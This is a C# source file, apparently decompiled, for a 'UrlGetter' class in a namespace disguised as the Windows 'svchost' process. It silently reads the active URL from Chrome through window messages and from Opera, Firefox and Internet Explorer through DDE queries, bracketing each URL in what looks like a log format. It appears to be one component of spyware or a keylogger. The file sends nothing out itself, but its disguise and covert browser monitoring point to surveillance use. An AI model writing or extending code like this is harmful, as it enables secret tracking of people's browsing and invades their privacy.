using System;
using System.Runtime.InteropServices;
using System.Text;

namespace svchost;

internal static class UrlGetter
{
	[Flags]
	private enum DdeFlags : uint
	{
		APPCLASS_STANDARD = 0u,
		APPCMD_CLIENTONLY = 0x10u
	}

	private const uint DMLERR_NO_ERROR = 0u;

	private const uint CF_TEXT = 1u;

	private const uint XCLASS_DATA = 8192u;

	private const uint XTYP_REQUEST = 8368u;

	public static string getUrl(IntPtr handle, string title)
	{
		if (title.Contains("Chrome"))
		{
			return getChromeUrl(handle);
		}
		if (title.Contains("Opera"))
		{
			return getOperaUrl();
		}
		if (title.Contains("Internet Explorer"))
		{
			return getIEUrl();
		}
		if (title.Contains("Firefox"))
		{
			return getFirefoxUrl();
		}
		return null;
	}

	private static string getChromeUrl(IntPtr handle)
	{
		try
		{
			IntPtr hWnd = FindWindowEx(handle, IntPtr.Zero, "Chrome_OmniboxView", IntPtr.Zero);
			StringBuilder stringBuilder = new StringBuilder(256);
			SendMessage(hWnd, 13, 256, stringBuilder);
			if (!string.IsNullOrEmpty(stringBuilder.ToString()))
			{
				return "[" + stringBuilder.ToString() + "]";
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	private static string getOperaUrl()
	{
		string result = null;
		try
		{
			uint pidInst = 0u;
			if (DdeInitialize(ref pidInst, IntPtr.Zero, DdeFlags.APPCMD_CLIENTONLY, 0u) != 0)
			{
				return null;
			}
			IntPtr intPtr = DdeCreateStringHandle(pidInst, "Opera", 0);
			IntPtr intPtr2 = DdeCreateStringHandle(pidInst, "WWW_GetWindowInfo", 0);
			IntPtr intPtr3 = DdeConnect(pidInst, intPtr, intPtr2, IntPtr.Zero);
			DdeFreeStringHandle(pidInst, intPtr);
			DdeFreeStringHandle(pidInst, intPtr2);
			if (intPtr3 != IntPtr.Zero)
			{
				IntPtr intPtr4 = DdeCreateStringHandle(pidInst, "0xFFFFFFFF", 0);
				IntPtr intPtr5 = DdeClientTransaction(null, 0, intPtr3, intPtr4, 1u, 8368u, 0, IntPtr.Zero);
				if (intPtr5 != IntPtr.Zero)
				{
					StringBuilder stringBuilder = new StringBuilder(512);
					if (DdeGetData_1(intPtr5, stringBuilder, stringBuilder.Capacity, 0) != 0)
					{
						result = (string.IsNullOrEmpty(stringBuilder.ToString()) ? null : ("[" + stringBuilder.ToString().Remove(stringBuilder.ToString().IndexOf(",")).Replace("\"", "") + "]"));
					}
				}
				DdeFreeStringHandle(pidInst, intPtr4);
				DdeDisconnect(intPtr3);
			}
			DdeUninitialize(pidInst);
			return result;
		}
		catch
		{
			return null;
		}
	}

	private static string getFirefoxUrl()
	{
		string result = null;
		try
		{
			uint pidInst = 0u;
			if (DdeInitialize(ref pidInst, IntPtr.Zero, DdeFlags.APPCMD_CLIENTONLY, 0u) != 0)
			{
				return null;
			}
			IntPtr intPtr = DdeCreateStringHandle(pidInst, "Firefox", 0);
			IntPtr intPtr2 = DdeCreateStringHandle(pidInst, "WWW_GetWindowInfo", 0);
			IntPtr intPtr3 = DdeConnect(pidInst, intPtr, intPtr2, IntPtr.Zero);
			DdeFreeStringHandle(pidInst, intPtr);
			DdeFreeStringHandle(pidInst, intPtr2);
			if (intPtr3 != IntPtr.Zero)
			{
				IntPtr intPtr4 = DdeCreateStringHandle(pidInst, "0xFFFFFFFF", 0);
				IntPtr intPtr5 = DdeClientTransaction(null, 0, intPtr3, intPtr4, 1u, 8368u, 0, IntPtr.Zero);
				if (intPtr5 != IntPtr.Zero)
				{
					StringBuilder stringBuilder = new StringBuilder(512);
					if (DdeGetData_1(intPtr5, stringBuilder, stringBuilder.Capacity, 0) != 0)
					{
						result = (string.IsNullOrEmpty(stringBuilder.ToString()) ? null : ("[" + stringBuilder.ToString().Remove(stringBuilder.ToString().IndexOf(",")).Replace("\"", "") + "]"));
					}
				}
				DdeFreeStringHandle(pidInst, intPtr4);
				DdeDisconnect(intPtr3);
			}
			DdeUninitialize(pidInst);
			return result;
		}
		catch
		{
			return null;
		}
	}

	private static string getIEUrl()
	{
		string result = null;
		try
		{
			uint pidInst = 0u;
			if (DdeInitialize(ref pidInst, IntPtr.Zero, DdeFlags.APPCMD_CLIENTONLY, 0u) != 0)
			{
				return null;
			}
			IntPtr intPtr = DdeCreateStringHandle(pidInst, "IExplore", 0);
			IntPtr intPtr2 = DdeCreateStringHandle(pidInst, "WWW_GetWindowInfo", 0);
			IntPtr intPtr3 = DdeConnect(pidInst, intPtr, intPtr2, IntPtr.Zero);
			DdeFreeStringHandle(pidInst, intPtr);
			DdeFreeStringHandle(pidInst, intPtr2);
			if (intPtr3 != IntPtr.Zero)
			{
				IntPtr intPtr4 = DdeCreateStringHandle(pidInst, "0xFFFFFFFF", 0);
				IntPtr intPtr5 = DdeClientTransaction(null, 0, intPtr3, intPtr4, 1u, 8368u, 0, IntPtr.Zero);
				if (intPtr5 != IntPtr.Zero)
				{
					StringBuilder stringBuilder = new StringBuilder(512);
					if (DdeGetData_1(intPtr5, stringBuilder, stringBuilder.Capacity, 0) != 0)
					{
						result = (string.IsNullOrEmpty(stringBuilder.ToString()) ? null : ("[" + stringBuilder.ToString().Remove(stringBuilder.ToString().IndexOf(",")).Replace("\"", "") + "]"));
					}
				}
				DdeFreeStringHandle(pidInst, intPtr4);
				DdeDisconnect(intPtr3);
			}
			DdeUninitialize(pidInst);
			return result;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, IntPtr windowTitle);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int SendMessage(IntPtr hWnd, int msg, int wParam, StringBuilder ClassName);

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern uint DdeInitialize([In][Out] ref uint pidInst, [In] IntPtr pfnCallback, [In] DdeFlags afCmd, [In] uint ulRes);

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern IntPtr DdeCreateStringHandle([In] uint idInst, [In] string psz, [In] int iCodePage);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DdeFreeStringHandle([In] uint idInst, [In] IntPtr hsz);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr DdeConnect([In] uint idInst, [In] IntPtr hszService, [In] IntPtr hszTopic, [Optional][In] IntPtr pCC);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DdeDisconnect([In] IntPtr hConv);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr DdeClientTransaction([Optional][In] byte[] pData, [In] int cbData, [In] IntPtr hConv, [Optional][In] IntPtr hszItem, [In] uint wFmt, [In] uint wType, [In] int dwTimeout, [Optional][Out] IntPtr pdwResult);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint DdeGetData([In] IntPtr hData, [Out] byte[] pDst, [In] int cbMax, [In] int cbOff);

	[DllImport("user32.dll", EntryPoint = "DdeGetData", SetLastError = true)]
	private static extern uint DdeGetData_1([In] IntPtr hData, [Out] StringBuilder pDst, [In] int cbMax, [In] int cbOff);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DdeUninitialize([In] uint idInst);
}
